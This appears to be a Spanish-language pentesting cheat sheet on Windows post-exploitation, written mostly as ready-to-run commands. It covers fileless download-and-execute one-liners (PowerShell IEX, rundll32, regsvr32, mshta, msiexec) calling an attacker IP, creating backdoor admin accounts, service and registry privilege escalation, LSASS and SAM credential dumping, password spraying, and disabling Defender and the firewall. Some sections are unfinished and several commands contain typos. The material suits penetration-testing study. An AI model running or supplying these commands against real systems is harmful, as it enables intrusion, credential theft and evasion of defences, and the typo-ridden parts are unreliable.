# Windows

* [Tips & Tricks](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#tips--tricks)
* [Descargando archivos](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#Descargando-archivos)
* [Tools](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#tools)
* [Ejecutando sin guardar localmente](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#ejecutando-sin-guardar-localmente)
* [Migrando proceso](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#migrando-proceso)
* [Persistencia](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#persistencia)
* [Password spray](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#password-spray-ldap)
* [DLL Hijacking](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#dll-hijacking)
* [Binpath](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#binpath)
* [Unquothed service path](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#unquothed-service-path)
* [Service registry permissions](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#service-registry-permissions)
* [Executable file](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#executable-file)
* [Registry autoruns](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#registry-autoruns)
* [Allways install Elevated](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#allways-install-elevated)
* [Credenciales usando cmdkey](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#credenciales-usando-cmdkey)
* [Credenciales en memoria](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#credenciales-en-memoria)
* [Credenciales en registro](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#credenciales-en-registro)
* [Credenciales en archivos de configuracion](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#credenciales-en-archivos-de-configuracion)
* [Credenciales en webconfig](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#credenciales-en-webconfig)
* [Credenciales en repair/sam](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#credenciales-en-repairsam)
* [Tareas programadas](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#tareas-programadas)
* [Token impersionation](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#token-impersionation)
* [Token impersionation print spoofer](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#token-impersionation-print-spoofer)
* [Bypassing](https://github.com/HerculesRD/HerculesDocs/blob/main/PostExploiting/Windows.md#bypassing)

## Tips & Tricks

1. Cuando tenes una shell, es mejor migrar a un proceso
que sea de la misma arquitectura de la pc donde estamos para que
no existan errores
2. C:\>powershell.exe -nop -exec bypass

https://lolbas-project.github.io/# donde meto esto?

## Descargando archivos

### webrequest

```powershell
Invoke-WebRequest -Uri "www.url.com/file" -OutFile "C:\path\file"
```

### wget

```powershell
wget "http://www.url.com" -outfile "file"
```

### Curl

```powershell
curl http://10.10.10.19:8000/file.exe --output file.exe
```

### Certutil

```powershell
certutil.exe -urlcache -f http://10.10.10.19/file.exe file.exe
```

### Powershell
```powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.10.19/file', 'output-file')
```

### Bitsadmin
```powershell
bitsadmin /transfer n http://10.10.10.19/imag/evil.txt d:\test\1.txt
```

### Wmic

```powershell
wmic os get /FORMAT:"http://10.10.10.19/evil.xsl"
```

### Windows Defender

```powershell
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url http://10.10.10.19/mimikatz.zip -path .\\mimikatz.zip
```

## Ejecutando sin guardar localmente

### Powershell

```powershell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.19/evil.txt'))"
```

### Rundll

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://10.10.10.19:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

### regsrv32

```powershell
regsvr32.exe /u /n /s /i:http://10.10.10.19:8888/file.sct scrobj.dll
```

### Msiexec

```powershell
msiexec /q /i http://10.10.10.19/evil.msi
```

### mshta

```powershell
mshta http://10.10.10.19/run.hta
```

## Tools

* [Powershell Empire](https://github.com/BC-SECURITY/Empire)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit)
* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Nishang](https://github.com/samratashok/nishang)
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [windowsenum](https://github.com/absolomb/WindowsEnum)
* [Watson](https://github.com/rasta-mouse/Watson)
* [WinEnum](https://github.com/neox41/WinEnum)
* [Windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [Mimikatz]()

## Migrando proceso

```shell
Is64BitOperatingSystem
#True

Is64BitProcess
#False #necesitamos migrar
#Podemos mandar la shell desde la ruta nativa del sistema con el path absoluto.
#Por ejemplo para tomar una reverse shell desde la windows:
C:\Windows\SysNative\WindowsPowershell\v1.0powershell IEX(New-Object New.WebClient).downloadString('http://IP:PORT/shell.ps1')
#esto te da el proceso de 64 bits ya
```

## Persistencia

```shell
net user nombreusuario password /add
net localgroup Administrators nombreusuario /add

#si no está abierto el puerto de SAMBA hay que abrirlo para poder 
#generar esa persistencia, y poder mandar comandos desde nuestro 
#host atacante Creamos la regla en el firewall

netsh advfirewall firewall add rule protocol=TCP dir=in localport=445 action=allow

netsh advfirewall firewall add rule protocol=TCP dir=out localport=445 action=allow

#creamos un nuevo recurso compartido
net share attacker_folder=C:\Windows\tmp /GRANT:Administrators,FULL

#cambiamos la policy
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

#y desde el host con el paquete de impacket
$impacket/examples/psexec.py WORKGROUP/nombreusuario:password\@R_IP cmd.exe
```

## Password Spray (LDAP)

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

## DLL Hijacking

### Enumeracion

```
Se carga en el contexto de un proceso en ejecucion

Es común que algunas DLL no estén disponibles cuando el ejecutable intente cargarlas

El orden de busqueda de una dll es:

1-Misma carpeta donde se carga el proceso o servicio

2-Directorio del sistema

3-Directorio del subsistema de 16bits

4-Directorio de Windows

5-Directorio actual

6-Directorios listados en PATH
```

### Explotacion

```
1-Elegir un servicio que se ejecute con privilegios

2-Identificar DLLs no encontradas. Con Process Monitor se pueden encontrar como "Name not Found"

3-Preparar una DLL maliciosa y compilarla

4-Colocar en alguno de los paths con permisos de escritura
```

## Binpath

### Enumeracion

```
Binpath es el atributo de un servicio que especifica ruta del ejecutable de ese servicio. La ruta del ejecutable se llama ImagePath

Los servicios son objetos asegurables. Quiere decir que tienen ACLs o permisos. Si el usuario tiene permisos sobre el servicio, puede modificar el binpath logrando ejecución arbitraria.
```

#### Accesschk
```powershell
#el /accepteula es solo necesario la primera vez que corremos el accesschk
#el accesschk es de sysinternals

accesschk.exe /accepteula -uwcqv [user_actual] [servicio]
```

#### Powerup

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Get-ModifiableService
```

### Explotacion

#### Manual

```powershell
#ver info del servicio
sc qc [servicio]
#modificar binpath
sc config [servicio] binPath= "\"path_malicioso""
#tambien podes ejecutar un comando en vez de mandar un ejecutable malicioso
sc config [servicio] binPath= "\"whoami""
#reiniciamos el servicio
net stop [servicio]
net start [servicio]
```

#### Metasploit/Meterpreter

```bash
use exploit/windows/local/service_permissions
```

#### Powerup

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Invoke-ServiceAbuse -name [service] -command [whoami]
```

## Unquothed service path

### Enumeracion

```
Para explotar, el path tiene que tener espacios y no tener comillas

Windows resuelve probando. Si Path C:\Program Files\servicio.exe, primero intenta "C:\Program.exe"
```

#### wmic

```powershell
wmic service get name,pathname,displayname,startmode | findstr /v /i auto | finstr /i /v "C:\Windows\\" | findstr /i /v """
```

#### wmiobject

```powershell
Get-WmiObject Win32_Service | select name,pathname,startmode,startname | where {$_.startmode -ne "disabled" -and $_.startname -eq "localsystem" -and $_.pathname -nomatch "'"" -and $_.pathname -nomatch "C:\\Windows"} | format-list
```

#### PowerUp

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Get-ServiceUnquothed
```

### Verificacion de permiso de escritura en el Path

```powershell
#el /accepteula solo se corre la primera vez que corremos accesschk
accesschk /accepteula -uwdq "path_completo"
```

### Explotacion

#### Manual

```powershell
#1-Creamos ejecutable malicioso
#2-Lo plantamos en el path
#3-reiniciamos el servicio
net stop [servicio]
net start [servicio]
```

#### Metasploit/Meterpreter

```bash
use exploit/windows/local/trusted_service_path
```

#### PowerUp

```powershell
#Opcion 3 - Powerup
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Write-ServiceBinary -name [servicio] -path [path_identificado]
```

## Service registry permissions

### Enumeracion

```
La base de datos de servicios se almacena en el registro. Como las claves y los valores son objetos asegurables que tienen permisos, si tenemos permiso de escritura podemos cambiar el ImagePath
```

#### Get-ACL

```powershell
Get-Acl -path HKLM:\System\CurrentControlSet\Services\* | Select path,AccessToString | Format-List
```

#### Accesschk

```powershell
#Solo escribir /accepteula la primera vez que ejecutamos accesschk
AccessChk.exe /accepteula -kvusw HKLM\System\CurrentControlSet\Services
```

### Explotacion

#### Powershell

```powershell
New-ItemProperty -path "HKLM:\System\CurrentControlSet\Services\[Servicio]" -name ImagePath -value "C:\shell.exe" -PropertyType ExpandString -Force

#reiniciamos el servicio
net stop [servicio]
net start [servicio]
```

#### CMD

```cmd
REG ADD HKLM\System\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d C:\Shell.exe /f
```

## Executable file

### Enumeracion

```
Los servicios son codigo ejecutable almacenado en el FileSystem. Se podria reemplazar el binario original por otro
```

#### Powershell

```powershell
Get-ChildItem [path] -recurse | Get-Acl | Select path,owner,accesstostring,group | Format-List
```

#### Accesschk

```powershell
#Solo ejecutar /accepteula la primera vez que ejecutamos el ejecutable este
Accesschk.exe /accepteula -vuw [path]
```

#### PowerUp

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Invoke-AllChecks
```

### Explotacion

```powershell
#Creamos shell.exe
#Reemplazamos ejecutable
Copy shell.exe "C:\Program\Program.exe" /y
```

## Registry autoruns

### Enumeracion

```
Los registry autoruns ejecutan binarios o scripts al iniciar sesion. Podemos modificarlos esperando que se loguee alguien con privilegios

Keys
KHLM\Software\Microsoft\Windows\CurrentVersion\Run, RunOnce, RunService, RunOnceService
HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run, RunOnce, RunService, RunOnceService
```

#### Powershell

```powershell
Get-ItemProperty [RegKeyPath]
```

#### PowerUp

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Get-ModifiableRegistryAutoRun
```

### Explotacion

```
Generar shell.exe y copiarlo en la ruta, modificando el archivo
```

## Allways install Elevated

### Enumeracion

```
Esto es una configuracion de que todo lo que se instala, por mas que el user no tenga privilegios, lo haga con permisos de System

Keys
HKLM\Software\Policies\Microsoft\Windows\Installer (AllwaysInstalledElevated=1)
HKCU\Software\Policies\Microsoft\Windows\Installer (AllwaysInstalledElevated=1)
```

#### PowerUp

```powershell
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Get-RegistryAlwaysInstallElevated
```

#### Powershell

```powershell
Get-ItemProperty -path HKLM\Software\Policies\Microsoft\Windows\installer
Get-ItemProperty -path HKCU\Software\Policies\Microsoft\Windows\installer
```

#### Metasploit/Meterpreter

```bash
use exploit/windows/local/always_install_elevated
```

### Explotacion

#### PowerUp

```powershell
#Opcion 1 - Powerup
#si aun no ejecutamos powerup
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
#Ahora si
Write-UserAddMsi
```

#### Metasploit/Meterpreter

```bash
use exploit/windows/local/always_install_elevated
```

## Credenciales usando cmdkey

### Enumeracion

```cmd
cmdkey /list 
```

### Explotacion

```cmd
runas /user:administrator /savecred "cmd.exe /k whoami" 
```

## Credenciales en memoria

```
Normalmente administrado por LSA

Generalmente necesitas privilegios, a veces esta en la memoria de una aplicacion. Generalmente usado para movimiento horizontal a otros sistemas
```

### Explotacion

TaskManager → Create Dump File (de LSASS.exe)

#### Powerexploit

```powershell
powerexploit.ps1
Out-MiniDump -Process (Get-Process -Id [PID])
```

#### Mimikittenz

```powershell
Invoke-Mimikittenz.ps1
```

#### procdump

```powershell
procdump -ma [PID]
```

## Credenciales en registro


### Enumeracion

```
Autologon
HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon\DefaultUsername, DefaultPassword

PUTTY
HKCU\Software\SimonTatham\Putty\Sessions\[dentro de sessiones] ("ProxyPassword")

VNC
HKCU\Software\TightVNC\Server
```

### Explotacion

#### Powershell - Autologon

```powershell
Get-ItemProperty -path Regstry::[Path_registry]
```

#### CMD - Autologon

```cmd
REG.exe query [Path_registry]
```

#### PowerUp

```powershell
Get-RegsitryAutoLogoon
```

#### Metasploit/Meterpreter

```bash
use post/windows/gather/credentials/windows_autologin
```

#### CMD - Busqueda

```cmd
REG.exe query HKLM /f passw /t REG_SZ /s
REG.exe query HKCU /f passw /t REG_SZ /s
```

#### VNC

* [vncpwd]
* [cain]

## Credenciales en archivos de configuracion

### Enumeracion

```
Windows permite una desinstalacion desatendida con un archivo para las respuestas de la instalacion que te ahorra tiempo. Este archivo puede tener contraseñas en base64.

Archivos:
Unattend.xml
Autounattend.xml

Ubicaciones:
%windir%/panther
%windir%/panther/unatthend
%windir%/System32/Sysprep
```

## Credenciales en webconfig

### Enumeracion

```
Puede contener credenciales de bases de datos en los connection string. Las bases de datos pueden estar en texto plano o protegidas por la data protection api. Si fueran protegidas por la DPA necesitas privilegios para poder descifrarla y SOLO se puede hacer localmente.
```

### Explotacion

#### PowerUp

```powershell
Get-WebConfig
```

#### ASPNET (descifrar)

```powershell
ASPNET_RegIis.exe -PDF "ConnectionStrings" [Carpeta_WebConfig]
```

## Credenciales en repair/sam

### Deteccion

```
Si se crea disco de recuperacion se almacena ahi una copia de la SAM
```

#### CMD

```
dir %SystemRoot%\Repair\
dir %SystemRoot%\System32\Config
dir %SystemRoot%\System32\Config\RegBack
```

### Explotacion

```
1-Copiar SAM y System a la maquina atacante
2-
$samdump2 system sam
3a-Crack con JTR o Hashcat
3b-PassTheHash
```

## Tareas programadas

### Enumeracion

#### PowerUp

```powershell
Get-ModifiableScheduledTaskFile
```

#### Task Scheduler

```powershell
schtasks.exe /query /tn [nombre_task] /xml
```

#### Powershell

```powershell
$schedule=New-Object -com("schedule.service")
$schedule.connect()
$task=$schedule.GetFolder("/").GetTasks(o)
$tasks | FL 
```

### Explotacion

```
Modificar o reemplazar el exe de la tarea desde el cmd
```

## Token impersionation

### Enumeracion

```
Funcionalidad de Windows que le permite a un usuario usar el contexto de ejecucion de otro usuario (ejemplo: SQL, IIS).
Por defecto todos los usuarios del grupo Administrador y los NT Authority, tienen este privilegio.

Necesitas los privilegios "impersonate token"
```

#### CMD

```cmd
whoami /priv
```

### Explotacion

```
#Hot Potato/Rotten Potato/Juicy Potato
1) Forzar autenticacion de la cuenta authority a un proxy propio
2) usar la info para obtener el token
3) abusar del token
###Falta desarrollo por cada tool
###por cambios o updates podrian no funcionar los potato
###para esto se usa WINRM
```

## Token impersionation print spoofer

### Enumeracion

```
Combina "printer bug" con "potato"
Necesita "Impersonate token" priv
```

FALTA DESARROLLAR1

## Bypassing

### Windows Defender

#### CMD

```powershell
sc config WinDefend start= disabled
sc stop WinDefend
```

#### Powershell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Remove Definitions

```cmd
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Windows Firewall

```cmd
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off
```

#### IP Whitelisting

```powershell
New-NetFirewallRule -Name hax0r -DisplayName hax0r -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress 10.10.10.19
```
